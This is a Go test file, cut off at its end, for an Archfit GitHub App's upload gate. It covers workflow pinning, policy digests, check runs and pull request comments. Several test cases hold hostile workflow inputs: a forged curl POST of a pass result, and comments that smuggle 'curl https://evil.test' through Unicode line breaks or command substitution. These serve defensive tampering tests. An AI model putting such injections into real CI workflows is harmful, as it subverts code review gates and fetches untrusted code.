package gate

import (
	"bytes"
	"cmp"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/alexei-led/archfit-app/internal/gate/feedback"
	"github.com/alexei-led/archfit-app/internal/gate/ingest"
	"github.com/alexei-led/archfit-app/internal/gate/records"
	"github.com/alexei-led/archfit-app/internal/github/api"
	"github.com/alexei-led/archfit-app/internal/store"
	"github.com/alexei-led/archfit-app/internal/wire/envelope"
	"github.com/alexei-led/archfit-app/internal/wire/manifest"
	"github.com/alexei-led/archfit-app/internal/wire/policy3"
	"github.com/alexei-led/archfit-app/internal/wire/result"
)

const (
	policy4       = "version: 3\nowners: [olivia]\nmodules:\n  app:\n    paths: [cmd/**, pkg/**]\n"
	engine4       = "v4.0.0"
	image4        = "sha256:a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90"
	actionPinned  = "4c1d2e3f405162738495a6b7c8d9e0f1a2b3c4d5" // the Action commit of the default branch's workflow
	actionBumped  = "5d2e3f405162738495a6b7c8d9e0f1a2b3c4d5e6" // a newer commit manifest 4 lists
	actionUnknown = "6e3f405162738495a6b7c8d9e0f1a2b3c4d5e6f7" // a commit manifest 4 does not list
)

// workflow4 is the Archfit 4 workflow file pinned to an Action commit.
func workflow4(commit, comment string, extra ...string) []byte {
	return []byte("name: archfit\non: [pull_request, push, merge_group]\npermissions:\n  id-token: write\njobs:\n  check:\n" +
		"    runs-on: ubuntu-latest\n    steps:\n      - uses: " + manifest.ActionRepository + "@" + commit + comment + "\n" +
		strings.Join(extra, ""))
}

// world4 is the world with an onboarded Archfit 4 repository: a schema 3 policy and the workflow on the default
// branch, and manifest 4 approving engine4 and two Action commits.
type world4 struct {
	*world
	tip string
}

func newWorld4(t *testing.T) *world4 {
	t.Helper()
	w := &world4{world: newWorld(t)}
	w.tip = w.gh.heads[branchKey(shopName, testBranch)]
	w.setFile(w.shop, testBranch, policyPath, []byte(policy4))
	w.setFile(w.shop, testBranch, ingest.WorkflowPath, workflow4(actionPinned, " # v4.0.0"))
	w.gate.v4.engineApproved = func(id manifest.Identity) bool {
		return id == manifest.Identity{EngineVersion: engine4, ImageDigest: image4, Platform: "linux/amd64"}
	}
	w.gate.v4.actionApproved = func(c string) bool { return c == actionPinned || c == actionBumped }
	w.approved(w.shop, policy4)
	return w
}

// unrecorded deletes the shop's repository record: no owner approved a policy yet.
func (w *world4) unrecorded() {
	w.t.Helper()
	if err := w.mem.Delete(context.Background(), store.Tenant(w.shop.InstallationID), records.RepoKey(w.shop.FullName)); err != nil {
		w.t.Fatal(err)
	}
}

// approved records policy as the approved policy of r: the repository is under change control (M2 task 20).
func (w *world4) approved(r api.Repo, policy string) {
	w.t.Helper()
	raw, err := records.Encode(&records.Repo{ApprovedDigest: policy3.Digest([]byte(policy))})
	if err != nil {
		w.t.Fatal(err)
	}
	if err := w.mem.Put(context.Background(), store.Tenant(r.InstallationID), records.RepoKey(r.FullName), raw); err != nil {
		w.t.Fatal(err)
	}
}

// spec4 is a consistent envelope 2 upload of a result golden for the pull: the run executed the default branch's
// workflow from its test merge commit, and read the policy at the tip.
type spec4 struct {
	uploadSpec
	env    envelope.EnvelopeV2
	result map[string]any
}

func (w *world4) spec4(p *pull, golden string) *spec4 {
	w.t.Helper()
	pl := w.gh.pulls[pullKey(p.repo.FullName, p.number)]
	s := &spec4{uploadSpec: w.spec(p, nil), result: w.result(golden, p.head)}
	s.claims.SHA = pl.MergeCommitSHA
	w.setFile(p.repo, pl.MergeCommitSHA, ingest.WorkflowPath, w.gh.files[fileKey(shopName, testBranch, ingest.WorkflowPath)])
	s.env = envelope.EnvelopeV2{
		SchemaVersion: envelope.SchemaV2, Repository: p.repo.FullName, Event: "pull_request", PullRequest: p.number,
		HeadSHA: p.head, MergeBaseSHA: pl.MergeBaseSHA, TargetRef: "refs/heads/" + testBranch, TargetSHA: w.tip,
		PolicyDigest: policy3.Digest([]byte(policy4)), RunID: p.runID, RunAttempt: 1,
		EngineVersion: engine4, ImageDigest: image4, Platform: "linux/amd64",
	}
	return s
}

// result reads a vendored engine result golden and binds it to head and the default branch's policy.
func (w *world4) result(golden, head string) map[string]any {
	w.t.Helper()
	raw, err := os.ReadFile(filepath.Join("..", "wire", "result", "testdata", "result", golden+".json"))
	if err != nil {
		w.t.Fatal(err)
	}
	var m map[string]any
	if err := json.Unmarshal(raw, &m); err != nil {
		w.t.Fatal(err)
	}
	m["head"] = head
	m["policy"].(map[string]any)["digest"] = policy3.Digest([]byte(policy4))
	return m
}

func (w *world4) send4(s *spec4) answer {
	w.t.Helper()
	body, err := json.Marshal(s.result)
	if err != nil {
		w.t.Fatal(err)
	}
	s.body = body
	s.env.PayloadDigest = envelope.PayloadDigest(body)
	w.gh.artifacts[s.env.RunID] = body // the run keeps the bytes it uploaded (M2 D6)
	if s.rawEnvelope, err = json.Marshal(s.env); err != nil {
		w.t.Fatal(err)
	}
	return w.send(s.uploadSpec)
}

func (w *world4) wantStatus(a answer, status, reason string) {
	w.t.Helper()
	if a.status != http.StatusOK || a.Status != status || a.Reason != reason {
		w.t.Fatalf("answer = %d %s, want 200 status=%s reason=%s", a.status, a.raw, status, reason)
	}
}

// pullRecord reads the stored pull record and the pull index entry of p.
func (w *world4) pullRecord(p *pull) (records.Pull, string) {
	w.t.Helper()
	var rec records.Pull
	if err := records.Load(context.Background(), w.mem, store.Tenant(p.repo.InstallationID), records.PullKey(p.repo.FullName, p.number), &rec); err != nil {
		w.t.Fatalf("pull record: %v", err)
	}
	raw, err := w.mem.Get(context.Background(), store.Tenant(p.repo.InstallationID), records.PullIndexKey(p.repo.FullName))
	if err != nil {
		w.t.Fatalf("pull index: %v", err)
	}
	x := records.Index{Schema: records.SchemaPullIndex}
	if err := records.Decode(raw, &x); err != nil {
		w.t.Fatal(err)
	}
	head, _ := x.Lookup(records.PullEntry(p.number))
	return rec, head
}

func TestUpload4AcceptsAPullRequest(t *testing.T) {
	for _, tc := range []struct {
		golden, status, conclusion string
		errors, requestKeys        []string
	}{
		{"pass", "pass", "success", nil, nil},
		// The policy has no gate: required, so a fail shows as neutral.
		{"deny", "fail", "neutral", []string{"no-chaos-to-runtime pkg_chaos pkg_runtime github.com/alexei-led/pumba/pkg/runtime/docker"},
			[]string{"no-chaos-to-runtime pkg_chaos pkg_runtime"}},
	} {
		t.Run(tc.golden, func(t *testing.T) {
			w := newWorld4(t)
			p := w.openPull(w.shop, 7)
			s := w.spec4(p, tc.golden)
			w.wantStatus(w.send4(s), tc.status, "")

			rec, head := w.pullRecord(p)
			want := records.Pull{Schema: records.SchemaPull, HeadSHA: p.head, RunID: p.runID, RunAttempt: 1,
				PayloadDigest: s.env.PayloadDigest, PolicyDigest: s.env.PolicyDigest, Status: tc.status, Date: "2026-11-10", Errors: tc.errors,
				RequestKeys: tc.requestKeys}
			if fmt.Sprint(rec) != fmt.Sprint(want) || head != p.head {
				t.Errorf("pull record = %+v, index head %q; want %+v, %q", rec, head, want, p.head)
			}
			c := w.wantGate(p, "completed", tc.conclusion)
			if c.ExternalID != fmt.Sprintf("v2:%d:1:%s", p.runID, s.env.PayloadDigest) {
				t.Errorf("external_id %q", c.ExternalID)
			}
			if comments := w.comments(p); len(comments) != 1 || !strings.Contains(comments[0].Body, "\n## Archfit: "+tc.status) {
				t.Errorf("comments = %+v", comments)
			}
			w.noStateCheck()
		})
	}
}

func TestUpload4AcceptsAPushAndAMergeGroup(t *testing.T) {
	t.Run("push", func(t *testing.T) {
		w := newWorld4(t)
		p := w.openPull(w.shop, 7)
		w.editRun(p, func(r *api.WorkflowRun) { r.Event, r.PullRequests, r.HeadSHA = "push", nil, w.tip })
		s := w.spec4(p, "pass")
		s.claims.EventName, s.claims.Ref, s.claims.SHA = "push", "refs/heads/"+testBranch, w.tip
		s.claims.JobWorkflowRef = shopName + "/" + testWorkflow + "@refs/heads/" + testBranch
		s.env.Event, s.env.PullRequest, s.env.HeadSHA, s.env.MergeBaseSHA = "push", 0, w.tip, w.tip
		s.result["head"] = w.tip
		w.wantStatus(w.send4(s), "pass", "")
		if _, err := w.mem.Get(context.Background(), store.Tenant(shopInstallation), records.PullIndexKey(shopName)); !errors.Is(err, store.ErrNotFound) {
			t.Errorf("a push stored a pull index: %v", err)
		}
	})
	t.Run("merge group", func(t *testing.T) {
		w := newWorld4(t)
		p := w.openPull(w.shop, 7)
		group := w.sha()
		w.gh.queue = map[string][]api.QueueEntry{branchKey(shopName, testBranch): {{Position: 1, HeadSHA: group, BaseSHA: w.tip, PullRequest: 7, PullHeadSHA: p.head}}}
		w.editRun(p, func(r *api.WorkflowRun) { r.Event, r.PullRequests, r.HeadSHA = "merge_group", nil, group })
		w.setFile(w.shop, group, ingest.WorkflowPath, w.gh.files[fileKey(shopName, testBranch, ingest.WorkflowPath)])
		s := w.spec4(p, "pass")
		ref := "refs/heads/gh-readonly-queue/main/pr-7-" + w.tip
		s.claims.EventName, s.claims.Ref, s.claims.SHA = "merge_group", ref, group
		s.claims.JobWorkflowRef = shopName + "/" + testWorkflow + "@" + ref
		s.env.Event, s.env.PullRequest, s.env.HeadSHA = "merge_group", 0, group
		s.result["head"] = group
		w.wantStatus(w.send4(s), "pass", "")
	})
}

func TestUpload4GivesUnknown(t *testing.T) {
	headDigest := policy3.Digest([]byte(policy4 + "  extra:\n    paths: [x/**]\n"))
	tests := []struct {
		name   string
		build  func(*world4, *pull, *spec4)
		reason string
	}{
		{"a wrong policy digest", func(w *world4, _ *pull, s *spec4) {
			s.env.PolicyDigest = "sha256:" + strings.Repeat("ab", 32)
			s.result["policy"].(map[string]any)["digest"] = s.env.PolicyDigest
		}, reasonPolicyNotTarget},
		{"a policy from the head", func(w *world4, p *pull, s *spec4) {
			w.setFile(w.shop, p.head, policyPath, []byte(policy4+"  extra:\n    paths: [x/**]\n"))
			s.env.PolicyDigest = headDigest
			s.result["policy"].(map[string]any)["digest"] = headDigest
		}, reasonPolicyNotTarget},
		{"a policy that changed since the run", func(w *world4, _ *pull, s *spec4) {
			old := w.sha()
			w.setFile(w.shop, old, policyPath, []byte(policy4+"  extra:\n    paths: [x/**]\n"))
			w.gh.compares[shopName+"|"+old+"|"+w.tip] = api.Comparison{Status: "ahead", Paths: []string{policyPath}}
			s.env.TargetSHA, s.env.PolicyDigest = old, headDigest
			s.result["policy"].(map[string]any)["digest"] = headDigest
		}, reasonPolicyChanged},
		{"a target commit that is not on the default branch", func(w *world4, p *pull, s *spec4) {
			w.setFile(w.shop, p.head, policyPath, []byte(policy4))
			w.gh.compares[shopName+"|"+p.head+"|"+w.tip] = api.Comparison{Status: "diverged"}
			s.env.TargetSHA = p.head
		}, reasonTargetOffBranch},
		{"a target commit GitHub does not know", func(_ *world4, _ *pull, s *spec4) {
			s.env.TargetSHA = strings.Repeat("0", 39) + "1"
		}, reasonTargetOffBranch},
		{"an unknown engine", func(w *world4, _ *pull, _ *spec4) {
			w.gate.v4.engineApproved = func(manifest.Identity) bool { return false }
		}, reasonUnknownEngine},
		{"the shipped manifest 4", func(w *world4, _ *pull, _ *spec4) {
			w.gate.v4.engineApproved = manifest.EngineApproved
		}, reasonUnknownEngine},
		{"an envelope that disagrees with GitHub", func(_ *world4, _ *pull, s *spec4) {
			s.env.RunAttempt = 2
		}, reasonEnvelopeMismatch},
		{"a pull request into another base", func(w *world4, p *pull, _ *spec4) {
			w.editPull(p, func(pl *api.Pull) { pl.BaseRef = "release" })
		}, reasonUnsupportedEvent},
		{"a result the App cannot read", func(_ *world4, _ *pull, s *spec4) {
			delete(s.result, "summary")
		}, reasonResultInvalid},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			w := newWorld4(t)
			p := w.openPull(w.shop, 7)
			s := w.spec4(p, "pass")
			tt.build(w, p, s)
			w.wantStatus(w.send4(s), "unknown", tt.reason)
			if rec, _ := w.pullRecord(p); rec.Status != "unknown" || rec.Errors != nil {
				t.Errorf("pull record = %+v, want status unknown and no error keys", rec)
			}
			if tt.reason == reasonEnvelopeMismatch || tt.reason == reasonUnsupportedEvent {
				page, err := NewPullViews(pullSummaryGitHub{w.gh}, w.mem).PullPage(t.Context(), w.shop, p.number)
				if err != nil {
					t.Fatal(err)
				}
				if page.View != nil || page.Message != "No result yet." {
					t.Fatalf("unpublished page %+v", page)
				}
				if n := w.gh.writes(); n != 0 {
					t.Errorf("%d check or comment writes for a run the App does not judge for the default branch", n)
				}
				return
			}
			c := w.wantGate(p, "completed", "action_required")
			if c.Title != "unknown, no verdict" || strings.Contains(w.feedbackText(p), "archfit: pass") {
				t.Errorf("check %q shows what the App did not accept:\n%s", c.Title, w.feedbackText(p))
			}
		})
	}
}

func TestUpload4KeepsNoErrorKeysOfAResultItOverrides(t *testing.T) {
	w := newWorld4(t)
	p := w.openPull(w.shop, 7)
	s := w.spec4(p, "deny")
	w.setFile(w.shop, s.claims.SHA, ingest.WorkflowPath, workflow4(actionUnknown, ""))
	w.wantStatus(w.send4(s), "unknown", reasonWorkflowChanged)
	if rec, _ := w.pullRecord(p); rec.Errors != nil {
		t.Errorf("error keys %q of a result the App did not accept", rec.Errors)
	}
}

func TestUpload4FirstPolicy(t *testing.T) {
	for name, setup := range map[string]func(*world4){
		"no policy on the default branch": func(w *world4) { w.removeFile(w.shop, testBranch, policyPath) },
		"a version 2 policy":              func(w *world4) { w.setFile(w.shop, testBranch, policyPath, []byte(basePolicy)) },
	} {
		t.Run(name, func(t *testing.T) {
			w := newWorld4(t)
			w.unrecorded()
			setup(w)
			p := w.openPull(w.shop, 7)
			s := w.spec4(p, "pass")
			w.wantStatus(w.send4(s), "unknown", reasonFirstPolicy)
			if rec, head := w.pullRecord(p); rec.RunID != p.runID || rec.PayloadDigest != s.env.PayloadDigest || head != p.head {
				t.Errorf("the onboarding result was not stored: %+v", rec)
			}
		})
	}

	t.Run("a repository under change control whose default branch lost its policy", func(t *testing.T) {
		w := newWorld4(t)
		w.removeFile(w.shop, testBranch, policyPath)
		w.wantStatus(w.send4(w.spec4(w.openPull(w.shop, 7), "pass")), "unknown", reasonPolicyUnapproved)
	})

	t.Run("a first pull request that also adds the workflow", func(t *testing.T) {
		w := newWorld4(t)
		w.unrecorded()
		w.removeFile(w.shop, testBranch, policyPath)
		wf := w.gh.files[fileKey(shopName, testBranch, ingest.WorkflowPath)]
		w.removeFile(w.shop, testBranch, ingest.WorkflowPath)
		p := w.openPull(w.shop, 7)
		s := w.spec4(p, "pass")
		w.setFile(w.shop, s.claims.SHA, ingest.WorkflowPath, wf)
		u := w.decide(s)
		if got := u.codes(); !slices.Equal(got, []string{reasonFirstPolicy, reasonWorkflowChanged}) {
			t.Errorf("reasons = %v, want the first policy and the workflow", got)
		}
	})
}

func TestUpload4WorkflowFile(t *testing.T) {
	tests := []struct {
		name     string
		workflow []byte // the file at the run's commit; the default branch pins actionPinned
		status   string
		reason   string
	}{
		{"a forged pass from an edited workflow", workflow4(actionPinned, " # v4.0.0",
			"      - run: curl -X POST https://app.archfit.test/v1/reports --data @pass.json\n"), "unknown", reasonWorkflowChanged},
		{"a ref-only Action bump to a manifest commit", workflow4(actionBumped, " # v4.0.1"), "pass", ""},
		{"a ref-only bump without a comment", workflow4(actionBumped, ""), "pass", ""},
		{"a ref bump to a commit manifest 4 does not list", workflow4(actionUnknown, " # v4.0.1"), "unknown", reasonWorkflowChanged},
		{"a ref bump to a tag", workflow4("v4", ""), "unknown", reasonWorkflowChanged},
		{"a ref bump with another edit", workflow4(actionBumped, " # v4.0.1", "      - run: echo hi\n"), "unknown", reasonWorkflowChanged},
		{"a ref glued to a hash", workflow4(actionBumped+"#v4", ""), "unknown", reasonWorkflowChanged},
		{"the workflow file removed", nil, "unknown", reasonWorkflowChanged},
		{"a comment that hides a U+2028 line break", workflow4(actionBumped, " # v4.0.1\u2028      - run: curl https://evil.test"), "unknown", reasonWorkflowChanged},
		{"a comment that hides a NEL line break", workflow4(actionBumped, " # v4\u0085      - run: curl https://evil.test"), "unknown", reasonWorkflowChanged},
		{"a comment with a command substitution", workflow4(actionBumped, " # $(curl https://evil.test)"), "unknown", reasonWorkflowChanged},
		{"a quote that does not close", workflow4(actionBumped+`"`, ""), "unknown", reasonWorkflowChanged},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			w := newWorld4(t)
			p := w.openPull(w.shop, 7)
			s := w.spec4(p, "pass")
			if tt.workflow == nil {
				w.removeFile(w.shop, s.claims.SHA, ingest.WorkflowPath)
			} else {
				w.setFile(w.shop, s.claims.SHA, ingest.WorkflowPath, tt.workflow)
			}
			w.wantStatus(w.send4(s), tt.status, tt.reason)
			if rec, _ := w.pullRecord(p); rec.Status != tt.status {
				t.Errorf("stored status %q, want %q", rec.Status, tt.status)
			}
		})
	}

	for _, tc := range []struct {
		name, target, run, status string
	}{
		{"a quoted uses line bumped",
			"      - uses: \"" + manifest.ActionRepository + "@" + actionPinned + "\"\n",
			"      - uses: \"" + manifest.ActionRepository + "@" + actionBumped + "\" # v4.0.1\n", "pass"},
		{"an Action reference inside a run script",
			"      - run: echo \"" + manifest.ActionRepository + "@" + actionPinned + " # pin\"\n",
			"      - run: echo \"" + manifest.ActionRepository + "@" + actionPinned + " # $(curl https://evil.test)\"\n", "unknown"},
		{"a CRLF line bumped",
			"      - uses: " + manifest.ActionRepository + "@" + actionPinned + "\r\n",
			"      - uses: " + manifest.ActionRepository + "@" + actionBumped + "\r\n", "unknown"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			w := newWorld4(t)
			p := w.openPull(w.shop, 7)
			w.setFile(w.shop, testBranch, ingest.WorkflowPath, []byte("jobs:\n  check:\n    steps:\n"+tc.target))
			s := w.spec4(p, "pass")
			w.setFile(w.shop, s.claims.SHA, ingest.WorkflowPath, []byte("jobs:\n  check:\n    steps:\n"+tc.run))
			if a := w.send4(s); a.Status != tc.status {
				t.Errorf("status = %s, want %s", a.raw, tc.status)
			}
		})
	}
	t.Run("an older merge commit behind a ref bump on the default branch", func(t *testing.T) {
		w := newWorld4(t)
		p := w.openPull(w.shop, 7)
		s := w.spec4(p, "pass")
		w.setFile(w.shop, testBranch, ingest.WorkflowPath, workflow4(actionBumped, " # v4.0.1"))
		w.wantStatus(w.send4(s), "pass", "")
	})
	t.Run("two files read without blob ids are not the same file", func(t *testing.T) {
		w := newWorld4(t)
		p := w.openPull(w.shop, 7)
		s := w.spec4(p, "pass")
		w.setFile(w.shop, s.claims.SHA, ingest.WorkflowPath, workflow4(actionPinned, " # v4.0.0",
			"      - run: curl -X POST https://app.archfit.test/v1/reports --data @pass.json\n"))
		w.gh.noBlobIDs = true
		w.wantStatus(w.send4(s), "unknown", reasonWorkflowChanged)
	})
	t.Run("the workflow record says to update the branch", func(t *testing.T) {
		w := newWorld4(t)
		p := w.openPull(w.shop, 7)
		s := w.spec4(p, "pass")
		w.setFile(w.shop, s.claims.SHA, ingest.WorkflowPath, workflow4(actionUnknown, ""))
		u := w.decide(s)
		rec := u.Reasons[0].Record
		if rec.Path != ingest.WorkflowPath || !strings.Contains(rec.Next.Text, "update the branch") || !strings.Contains(rec.Next.Text, "an owner approves") {
			t.Errorf("record = %+v", rec)
		}
		if got := result.Record(result.Result{Unknown: []result.Unknown{rec}, Summary: "archfit: unknown, no verdict"}); !strings.HasPrefix(got, ingest.WorkflowPath+": tool: differs from main\n") {
			t.Errorf("rendered record = %q", got)
		}
	})
}

// policy4Required is policy4 with a gate that blocks.
const policy4Required = "version: 3\ngate: required\nowners: [olivia]\nmodules:\n  app:\n    paths: [cmd/**, pkg/**]\n"

// require makes the default branch's policy required and s a run of it.
func (w *world4) require(s *spec4) {
	w.setFile(w.shop, testBranch, policyPath, []byte(policy4Required))
	w.approved(w.shop, policy4Required)
	s.env.PolicyDigest = policy3.Digest([]byte(policy4Required))
	s.result["policy"].(map[string]any)["digest"] = s.env.PolicyDigest
}

// noStateCheck fails when anything wrote archfit/state.
func (w *world4) noStateCheck() {
	w.t.Helper()
	for _, c := range w.gh.checkWrites {
		if c.Name == stateCheckName {
			w.t.Fatalf("archfit/state written on %s", c.HeadSHA)
		}
	}
}

// latestGate is the newest archfit/gate run of a head, the one GitHub shows; ok is false without one.
func (w *world4) latestGate(head string) (api.CheckRun, bool) {
	runs := w.gh.checkRuns(shopName, head, gateCheckName)
	if len(runs) == 0 {
		return api.CheckRun{}, false
	}
	return slices.MaxFunc(runs, func(a, b api.CheckRun) int { return cmp.Compare(a.ID, b.ID) }), true
}

func TestUpload4PublishesTheResult(t *testing.T) {
	t.Run("a fail in a required policy", func(t *testing.T) {
		w := newWorld4(t)
		p := w.openPull(w.shop, 7)
		s := w.spec4(p, "deny")
		w.require(s)
		w.wantStatus(w.send4(s), "fail", "")
		c := w.wantGate(p, "completed", "failure")
		if c.Title != "fail, 1 error" || len(c.Annotations) != 1 || c.Annotations[0].Path != "pkg/chaos/netem/netem.go" || c.Annotations[0].Line != 8 {
			t.Errorf("check %q with annotations %+v", c.Title, c.Annotations)
		}
		body := w.comments(p)[0].Body
		if !strings.Contains(body, "\n## Archfit: fail, 1 error\n") || !strings.HasSuffix(body, "**Author:** fix the code and push.\n") {
			t.Errorf("comment:\n%s", body)
		}
		w.noStateCheck()
	})
	t.Run("a forged pass over a changed workflow shows only the App's record", func(t *testing.T) {
		w := newWorld4(t)
		p := w.openPull(w.shop, 7)
		s := w.spec4(p, "pass")
		w.require(s)
		w.setFile(w.shop, s.claims.SHA, ingest.WorkflowPath, workflow4(actionUnknown, ""))
		w.wantStatus(w.send4(s), "unknown", reasonWorkflowChanged)
		w.wantGate(p, "completed", "action_required")
		text := w.feedbackText(p)
		if !strings.Contains(text, ingest.WorkflowPath+": tool: differs from main") || strings.Contains(text, "archfit: pass") {
			t.Errorf("feedback:\n%s", text)
		}
		w.noSuccess()
	})
	t.Run("a push writes the check and no comment", func(t *testing.T) {
		w := newWorld4(t)
		p := w.openPull(w.shop, 7)
		w.editRun(p, func(r *api.WorkflowRun) { r.Event, r.PullRequests, r.HeadSHA = "push", nil, w.tip })
		s := w.spec4(p, "pass")
		s.claims.EventName, s.claims.Ref, s.claims.SHA = "push", "refs/heads/"+testBranch, w.tip
		s.claims.JobWorkflowRef = shopName + "/" + testWorkflow + "@refs/heads/" + testBranch
		s.env.Event, s.env.PullRequest, s.env.HeadSHA, s.env.MergeBaseSHA = "push", 0, w.tip, w.tip
		s.result["head"] = w.tip
		w.wantStatus(w.send4(s), "pass", "")
		if c, ok := w.latestGate(w.tip); !ok || c.Conclusion != "success" {
			t.Errorf("check on the pushed commit = %+v", c)
		}
		if w.gh.commentOps != 0 {
			t.Errorf("%d comment writes for a push", w.gh.commentOps)
		}
	})
	t.Run("a merge group writes the check on its commit", func(t *testing.T) {
		w := newWorld4(t)
		p := w.openPull(w.shop, 7)
		group := w.sha()
		w.gh.queue = map[string][]api.QueueEntry{branchKey(shopName, testBranch): {{Position: 1, HeadSHA: group, BaseSHA: w.tip, PullRequest: 7, PullHeadSHA: p.head}}}
		w.editRun(p, func(r *api.WorkflowRun) { r.Event, r.PullRequests, r.HeadSHA = "merge_group", nil, group })
		w.setFile(w.shop, group, ingest.WorkflowPath, w.gh.files[fileKey(shopName, testBranch, ingest.WorkflowPath)])
		s := w.spec4(p, "deny")
		w.require(s)
		ref := "refs/heads/gh-readonly-queue/main/pr-7-" + w.tip
		s.claims.EventName, s.claims.Ref, s.claims.SHA = "merge_group", ref, group
		s.claims.JobWorkflowRef = shopName + "/" + testWorkflow + "@" + ref
		s.env.Event, s.env.PullRequest, s.env.HeadSHA = "merge_group", 0, group
		s.result["head"] = group
		w.wantStatus(w.send4(s), "fail", "")
		if c, ok := w.latestGate(group); !ok || c.Conclusion != "failure" {
			t.Errorf("check on the group commit = %+v", c)
		}
		if w.gh.commentOps != 0 {
			t.Errorf("%d comment writes for a merge group", w.gh.commentOps)
		}
	})
	t.Run("a decision from a default branch head that moved writes nothing", func(t *testing.T) {
		w := newWorld4(t)
		p := w.openPull(w.shop, 7)
		s := w.spec4(p, "pass")
		body, _ := json.Marshal(s.result)
		s.body = body
		s.env.PayloadDigest = envelope.PayloadDigest(body)
		s.rawEnvelope, _ = json.Marshal(s.env)
		u, err := w.gate.v4.receiver.ReceiveV2(context.Background(), w.request(s.uploadSpec))
		if err != nil {
			t.Fatal(err)
		}
		d, err := w.gate.v4.decide(context.Background(), u)
		if err != nil || d.Status != result.StatusPass {
			t.Fatalf("decide = %+v, %v", d, err)
		}
		w.gh.heads[branchKey(shopName, testBranch)] = w.sha() // the policy merged after the decision
		if err := w.gate.v4.publish(context.Background(), u, d); !errors.Is(err, feedback.ErrStaleInputs) {
			t.Errorf("publish = %v, want ErrStaleInputs", err)
		}
		if n := w.gh.writes(); n != 0 {
			t.Errorf("%d writes from a stale decision", n)
		}
	})
	t.Run("a failed write answers a retry", func(t *testing.T) {
		w := newWorld4(t)
		p := w.openPull(w.shop, 7)
		s := w.spec4(p, "pass")
		w.gh.fail["CreateCheckRun"] = errors.New("fake: GitHub is down")
		if a := w.send4(s); a.status != http.StatusServiceUnavailable || a.Error != codeUnavailable {
			t.Errorf("answer = %d %s, want 503 unavailable", a.status, a.raw)
		}
	})
}

// sharePull4 opens pull request number into base on p's head, with its own workflow run of that head.
func (w *world4) sharePull4(p *pull, number int, base string) *pull {
	q := w.openPull(w.shop, number)
	w.editPull(q, func(pl *api.Pull) { pl.HeadSHA, pl.BaseRef = p.head, base })
	w.editRun(q, func(r *api.WorkflowRun) { r.HeadSHA = p.head })
	q.head = p.head
	return q
}

// A check is per commit. Only a run the App judges for the default branch writes it: a pull request into another
// base, or an upload that does not match its run, writes nothing, so the commit keeps the check it had. That is no
// check or a pending one, which blocks a merge, or the result of the pull request into the default branch.
func TestUpload4SharedHead(t *testing.T) {
	type before struct {
		name       string
		setup      func(*world4, *pull)
		wantStatus string // "" = no archfit/gate on the commit, which a required check reads as missing
		wantResult string
	}
	befores := []before{
		{"no check", func(*world4, *pull) {}, "", ""},
		{"a pending check", func(w *world4, p *pull) {
			if _, err := w.gh.CreateCheckRun(context.Background(), p.repo.RepoRef, api.CheckRun{Name: gateCheck4, HeadSHA: p.head, Status: "in_progress"}); err != nil {
				w.t.Fatal(err)
			}
		}, "in_progress", ""},
		{"a fail of the pull request into the default branch", func(w *world4, p *pull) {
			s := w.spec4(p, "deny")
			w.require(s)
			w.wantStatus(w.send4(s), "fail", "")
		}, "completed", "failure"},
		{"a pass of the pull request into the default branch", func(w *world4, p *pull) {
			w.wantStatus(w.send4(w.spec4(p, "pass")), "pass", "")
		}, "completed", "success"},
	}
	for _, b := range befores {
		for name, upload := range map[string]func(*world4, *pull){
			"then a pull request into another base on the same commit": func(w *world4, p *pull) {
				q := w.sharePull4(p, 8, "release")
				w.wantStatus(w.send4(w.spec4(q, "pass")), "unknown", reasonUnsupportedEvent)
				if n := len(w.comments(q)); n != 0 {
					w.t.Errorf("%d comments on the pull request into another base", n)
				}
			},
			"then an upload that does not match its run": func(w *world4, p *pull) {
				s := w.spec4(p, "pass")
				s.env.RunAttempt = 2
				w.wantStatus(w.send4(s), "unknown", reasonEnvelopeMismatch)
			},
		} {
			t.Run(b.name+", "+name, func(t *testing.T) {
				w := newWorld4(t)
				p := w.openPull(w.shop, 7)
				b.setup(w, p)
				before := w.gh.writes()
				upload(w, p)
				if n := w.gh.writes() - before; n != 0 {
					t.Errorf("%d check or comment writes", n)
				}
				c, ok := w.latestGate(p.head)
				switch {
				case b.wantStatus == "" && ok:
					t.Errorf("a check appeared: %+v", c)
				case b.wantStatus != "" && (!ok || c.Status != b.wantStatus || c.Conclusion != b.wantResult):
					t.Errorf("check = %+v, want %s %q", c, b.wantStatus, b.wantResult)
				}
			})
		}
	}

	t.Run("two pull requests into the default branch: the newest run's check, a comment each", func(t *testing.T) {
		w := newWorld4(t)
		p := w.openPull(w.shop, 7)
		q := w.sharePull4(p, 9, testBranch)
		older := w.spec4(p, "deny")
		w.require(older)
		w.wantStatus(w.send4(older), "fail", "")
		newer := w.spec4(q, "pass")
		w.require(newer)
		w.wantStatus(w.send4(newer), "pass", "")
		if c, _ := w.latestGate(p.head); c.Conclusion != "success" || !strings.HasPrefix(c.ExternalID, fmt.Sprintf("v2:%d:1:", q.runID)) {
			t.Errorf("check = %+v, want the newest run %d", c, q.runID)
		}

		// A re-run of the older run is still older than the newest run: its check stays, its own comment moves.
		w.editRun(p, func(r *api.WorkflowRun) { r.Attempt = 2 })
		rerun := w.spec4(p, "deny")
		w.require(rerun)
		rerun.claims.RunAttempt, rerun.env.RunAttempt = 2, 2
		w.wantStatus(w.send4(rerun), "fail", "")
		if c, _ := w.latestGate(p.head); c.Conclusion != "success" || !strings.HasPrefix(c.ExternalID, fmt.Sprintf("v2:%d:1:", q.runID)) {
			t.Errorf("the older run overwrote the newer check: %+v", c)
		}
		if body := w.comments(p)[0].Body; !strings.Contains(body, fmt.Sprintf("run %d.2 -->", p.runID)) || !strings.Contains(body, "\n## Archfit: fail, 1 error\n") {
			t.Errorf("comment of #7:\n%s", body)
		}
		page, err := NewPullViews(pullSummaryGitHub{w.gh}, w.mem).PullPage(t.Context(), w.shop, p.number)
		if err != nil {
			t.Fatal(err)
		}
		if page.View != nil || page.Message != "A newer check is shown for this commit." {
			t.Fatalf("superseded page %+v", page)
		}
		if body := w.comments(q)[0].Body; !strings.HasSuffix(body, "\n## Archfit: pass\n") {
			t.Errorf("comment of #9:\n%s", body)
		}
	})
}

func TestUpload4AnswersAFailedReadWithARetry(t *testing.T) {
	for method, want := range map[string]answer{
